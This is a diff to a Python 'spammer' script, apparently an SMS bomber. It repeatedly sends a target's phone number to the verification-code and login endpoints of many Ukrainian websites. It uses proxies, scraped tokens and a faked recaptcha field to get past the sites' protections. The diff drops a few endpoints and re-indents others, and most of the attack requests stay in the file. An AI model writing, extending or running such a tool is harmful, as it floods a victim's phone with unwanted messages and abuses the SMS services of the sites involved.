@@ -51,12 +51,6 @@ else:
 run = int(console.input('[green]Введите количество повторов (1-25):\n[blue]spammer>> '))
 for _ in track(range(run)):
  try:
-         formatted_phone = format_phone(number, "+###+##+###+##+##")
-         requests.post("https://kumo.com.ua/registration/sms/", data={"phone": "+" + number, "_token": "l0H2NaVjz5Lr07eKrGrz8aR8FZ1tAHiPB6bwVaz0", "g-recaptcha-response": "1"}, headers=headers, proxies=proxies)
-         print('kumo.com.ua')
- except:
-         print('Не отправлено (kumo.com.ua)')
- try:
          requests.post("https://my.ctrs.com.ua/api/auth/login", data={"provider": "phone", "identity": number}, headers=headers, proxies=proxies)#https://www.citrus.ua/?gclsrc=aw.ds&gclid=CjwKCAiAs92MBhAXEiwAXTi253UnT0-Ws93B3drlp81h97IFAOzTqmkLJLEStUktScA14Vu5Jn8AShoCS-UQAvD_BwE
          print('my.ctrs.com')
  except:
@@ -87,10 +81,10 @@ for _ in track(range(run)):
  except:
          print('Не отправлено (zolotakoroleva.ua)')
  try:
-     requests.post('https://my.xtra.tv/api/service?lang=uk', data={'phone': number, "first_name": Настя, "surname": Сосикиная}, headers=headers, proxies=proxies)
-     print('xtra.tv-service')
+         requests.post('https://my.xtra.tv/api/service?lang=uk', data={'phone': number, "first_name": Настя, "surname": Сосикиная}, headers=headers, proxies=proxies)
+         print('xtra.tv-service')
  except:
-     print('Не доставлено (xtra.tv-service)')
+         print('Не доставлено (xtra.tv-service)')
  try:
          requests.post("https://mozayka.com.ua/!processing/ajax.php", data={"phone": "+" + number, "mp_m": "sendsmscodereg", "token": "9d064a2beeb932ae5de11f74631269b4"}, headers=headers, proxies=proxies)
          print('mozayka.com.ua')
@@ -136,11 +130,6 @@ for _ in track(range(run)):
          print('prosto.tv')
  except:
          print('Не отправлено (prosto.tv)')
- try:
-         requests.post("https://bi.ua/api/v1/accounts", json={"grand_type": "sms_code", "login": "Сергей", "phone": number, "stage": "1"}, headers=headers, proxies=proxies)
-         print('bi.ua')
- except:
-         print('Не отправлено (bi.ua)')
  try:
          requests.post("https://sportbank.com.ua/send-sms", data={"phone": "+" + number, "agree": "1"}, headers=headers, proxies=proxies)
          print('sportbank.com.ua')
